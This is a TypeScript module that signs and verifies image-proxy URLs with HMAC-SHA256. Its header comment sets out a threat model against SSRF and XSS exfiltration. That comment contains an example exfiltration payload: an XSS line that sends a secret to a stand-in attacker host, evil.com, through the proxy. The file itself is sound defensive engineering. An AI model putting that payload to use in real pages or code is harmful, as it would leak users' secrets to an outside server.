/**
 * HMAC signing for /api/img-proxy URLs.
 *
 * Why: PR 9 added /api/img-proxy + tightened CSP `img-src 'self' data:`
 * to keep external image URLs from going direct to attacker-controlled
 * servers. But a future XSS payload in the dashboard origin could still
 * do `new Image().src = '/api/img-proxy?u=https://evil.com/leak?d=' +
 * secret` — the server fetches evil.com server-side and the query
 * string leaks regardless of what the browser does with the response
 * bytes. URL is the out-channel; tightening the response surface
 * doesn't close it.
 *
 * Closing it: server signs every approved proxy URL with HMAC-SHA256
 * before emitting it into the dashboard's JSON / HTML. The proxy
 * refuses any `?u=` without a matching `?s=`. An XSS payload that
 * fabricates a proxy URL for evil.com cannot construct a valid
 * signature without the server-side secret, so the fabricated URL
 * 401s at the proxy and never reaches the upstream fetch.
 *
 * Threat model boundary: this closes the **cross-origin SSRF** vector
 * (a hostile page that loads `<img src="http://localhost:3000/api/img-proxy?u=…">`)
 * AND the **fabricated-URL exfil** vector (XSS without the
 * signing-endpoint round-trip). XSS that successfully calls
 * /api/img-proxy/sign — which requires the dashboard session — can
 * still sign arbitrary URLs, so an XSS-with-session attacker retains
 * a (rate-limited, audit-loggable) exfil path. Mitigating that
 * requires content-addressable proxying or fully server-side markdown
 * rendering, both significantly larger refactors; documented as
 * residual.
 *
 * Secret lifetime: persisted to ~/.nostr-station/img-proxy-secret on
 * first use (0o600, atomic write). Reused across server restarts so
 * signed URLs that the dashboard cached in localStorage (Ditto theme
 * bgImage in particular — see routes/ditto.ts) keep verifying after
 * a process bounce, instead of 401-ing until the next theme sync.
 * Threat model unchanged: an attacker with filesystem read on this
 * host can forge proxy URLs, but they already own the bunker client,
 * AI keys, and relay DB stored next to this file — disk persistence
 * doesn't widen the FS-read attacker's surface. If the file can't be
 * read or written (read-only home, exotic FS), we fall back to an
 * in-memory 32-byte random secret for the lifetime of the process —
 * same behavior as before, just with the restart-invalidation
 * trade-off the per-process model carried.
 */

import crypto from 'crypto';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { atomicWriteText } from './atomic-write.js';

function loadOrCreateSecret(): Buffer {
  const home = process.env.NOSTR_STATION_HOME || path.join(os.homedir(), '.nostr-station');
  const file = path.join(home, 'img-proxy-secret');
  try {
    const hex = fs.readFileSync(file, 'utf8').trim();
    if (/^[0-9a-f]{64}$/.test(hex)) return Buffer.from(hex, 'hex');
  } catch { /* missing or unreadable — fall through to generate */ }
  const fresh = crypto.randomBytes(32);
  try {
    atomicWriteText(file, fresh.toString('hex') + '\n');
  } catch {
    // FS unavailable (read-only home, sandbox, etc.). Stay in-memory —
    // signed URLs will still verify within this process; they'll just
    // 401 after a restart, matching the original behavior.
  }
  return fresh;
}

const SECRET = loadOrCreateSecret();

/**
 * Sign a raw external URL and return the proxy URL the browser should
 * embed. Returns `null` if the input isn't a string we'd be willing to
 * proxy (caller should fall back to omitting the field).
 *
 * NOTE: this is the SERVER-side helper. It does NOT validate the URL
 * against the proxy's runtime gates (https-only, private-IP refusal,
 * size cap, content-type allowlist) — those still run inside
 * handleImgProxy on each request. Signing only proves "the server
 * approved this URL"; the proxy enforces additional invariants when
 * the bytes actually move.
 */
export function signProxyUrl(rawUrl: unknown): string | null {
  if (typeof rawUrl !== 'string') return null;
  const trimmed = rawUrl.trim();
  if (!trimmed) return null;
  // Loopback / data: / blob: / same-origin caller paths are NEVER signed
  // — the dashboard renders them directly via CSP `img-src 'self' data:`
  // and there's no SSRF vector that benefits from routing them through
  // the proxy.
  if (trimmed.startsWith('data:') || trimmed.startsWith('blob:')) return null;
  try {
    const parsed = new URL(trimmed);
    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return null;
    const host = parsed.hostname.toLowerCase();
    if (host === '127.0.0.1' || host === 'localhost' || host === '::1'
        || host.endsWith('.localhost')) return null;
    // Canonical form: re-stringify so the sig is over a stable URL even
    // if the caller passed extra whitespace / fragment / etc. matches
    // what handleImgProxy verifies against.
    const canon = parsed.toString();
    const sig = signature(canon);
    return `/api/img-proxy?u=${encodeURIComponent(canon)}&s=${sig}`;
  } catch {
    return null;
  }
}

/**
 * Verify that `rawUrl` (the canonical URL string passed as `?u=`) was
 * signed by this process. Constant-time comparison. Returns false on
 * any malformed input.
 */
export function verifyProxySignature(rawUrl: string, sig: string): boolean {
  if (typeof rawUrl !== 'string' || typeof sig !== 'string') return false;
  if (!rawUrl || !sig) return false;
  const expected = signature(rawUrl);
  // Base64url decode-compare is fine; we compare the already-encoded
  // strings since both sides are produced by the same encoding.
  if (expected.length !== sig.length) return false;
  try {
    return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(sig));
  } catch {
    return false;
  }
}

function signature(canonicalUrl: string): string {
  return crypto
    .createHmac('sha256', SECRET)
    .update(canonicalUrl)
    .digest('base64url');
}
